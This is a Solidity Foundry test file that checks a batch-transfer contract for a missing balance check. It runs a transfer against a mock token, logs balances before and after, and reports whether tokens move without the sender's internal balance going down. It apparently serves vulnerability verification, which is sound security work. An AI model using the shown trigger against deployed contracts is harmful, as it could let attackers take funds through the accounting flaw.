// SPDX-License-Identifier: MIT
pragma solidity 0.8.26;
pragma experimental ABIEncoderV2;

import "forge-std/Test.sol";
import "../src/0x2972d548497286d18e92b5fa1f8f9139e5653fd2.sol";

contract DemoTest is Test {
    demo public batchTransfer;
    MockToken public token;
    address owner = address(this);
    address sender = address(0x1);
    address receiver = address(0x2);

    function setUp() public {
        // Deploy contracts
        batchTransfer = new demo();
        token = new MockToken();
        
        // Mint tokens to sender
        token.mint(sender, 500 ether);
        
        // Approve token in batch transfer contract
        batchTransfer.approveToken(address(token));
    }

    function testMissingBalanceCheck() public {
        // Simulate sender approval in token contract
        vm.prank(sender);
        token.approve(address(batchTransfer), type(uint256).max);

        // Attempt transfer of 200 tokens
        address[] memory receivers = new address[](1);
        receivers[0] = receiver;
        
        uint[] memory amounts = new uint[](1);
        amounts[0] = 200 ether;

        // --- 新增差分验证代码 ---
        console.log("--- BEFORE-Trigger State Snapshot ---");
        // 记录攻击前关键状态
        uint senderInternalBefore = batchTransfer.getUserBalance(sender);
        uint receiverInternalBefore = batchTransfer.getUserBalance(receiver);
        uint senderTokenBalanceBefore = token.balanceOf(sender);
        
        console.log("PRE-STATE VALUES:");
        console.log("Sender internal balance (batchTransfer):", senderInternalBefore);
        console.log("Receiver internal balance (batchTransfer):", receiverInternalBefore);
        console.log("Sender token balance (token contract):", senderTokenBalanceBefore);

        // 执行攻击操作
        console.log("--- Trigger Action ---");
        vm.prank(sender);
        batchTransfer.transfer(sender, address(token), receivers, amounts);

        console.log("--- AFTER-Trigger State Snapshot ---");
        // 记录攻击后关键状态
        uint senderInternalAfter = batchTransfer.getUserBalance(sender);
        uint receiverInternalAfter = batchTransfer.getUserBalance(receiver);
        uint senderTokenBalanceAfter = token.balanceOf(sender);
        
        console.log("POST-STATE VALUES:");
        console.log("Sender internal balance (batchTransfer):", senderInternalAfter);
        console.log("Receiver internal balance (batchTransfer):", receiverInternalAfter);
        console.log("Sender token balance (token contract):", senderTokenBalanceAfter);

        // 计算状态差异
        int256 internalSenderDiff = int256(senderInternalAfter) - int256(senderInternalBefore);
        int256 internalReceiverDiff = int256(receiverInternalAfter) - int256(receiverInternalBefore);
        int256 tokenBalanceDiff = int256(senderTokenBalanceAfter) - int256(senderTokenBalanceBefore);

        console.log("--- DIFFERENTIAL ANALYSIS ---");
        console.log("Internal sender balance diff: %s", internalSenderDiff);
        console.log("Internal receiver balance diff: %s", internalReceiverDiff);
        console.log("Sender token balance diff: %s", tokenBalanceDiff);

        // 漏洞存在条件验证：
        // 1. 接收方内部余额增加恰为200 ether（攻击成功）
        // 2. 发送方内部余额不变（漏洞特征）
        // 3. 发送方代币余额减少200 ether（实际转账发生）
        bool vulnerabilityDetected = 
            internalSenderDiff == 0 && 
            internalReceiverDiff == int256(200 ether) && 
            tokenBalanceDiff == -int256(200 ether);
        
        if (vulnerabilityDetected) {
            console.log("VERDICT: Vulnerability Exists: Internal accounting mismatch observed (sender balance not reduced while tokens transferred)");
        } else {
            console.log("VERDICT: Vulnerability not Exist: State changes consistent with expected behavior");
        }
        // --- 差分验证代码结束 ---
    }
}

contract MockToken {
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    function mint(address to, uint256 amount) public {
        balanceOf[to] += amount;
    }

    function approve(address spender, uint256 amount) public returns (bool) {
        allowance[msg.sender][spender] = amount;
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) public returns (bool) {
        require(balanceOf[from] >= amount, "Insufficient token balance");
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}